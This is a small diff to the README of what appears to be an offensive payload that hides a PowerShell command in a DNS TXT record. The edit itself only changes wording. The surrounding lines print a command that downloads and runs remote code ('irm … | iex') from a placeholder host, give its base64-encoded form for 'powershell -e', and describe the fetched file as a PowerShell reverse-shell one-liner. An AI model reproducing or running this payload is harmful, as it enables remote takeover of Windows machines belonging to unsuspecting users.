@@ -11,7 +11,7 @@ DEFINE  #MY_TARGET_URL example.com
 No base64 can be used as an option by replacing "$a=",";powershell -e $a" with just "|iex" for the STRING payload below. Examples of the decoded command and encoded command are shown below to put into DNS TXT record.
 Decoded: "irm http://MY_TARGET_URL/T1.txt | iex"
 Encoded: "aQByAG0AIABoAHQAdABwADoALwAvAGUAeABhAG0AcABsAGUALgBjAG8AbQAvAFQAMQAuAHQAeAB0ACAAfAAgAGkAZQB4AA=="
-powershellReverseShellOne-liner.ps1 is identical to T1.txt. (shortened due to character limitations)
+powershellReverseShellOne-liner.ps1 is identical to T1.txt. (file name shortened due to character limitations)
 ## Windows Commands (used in payload)
 ### Execute DNS TXT Payload
 ```Powershell
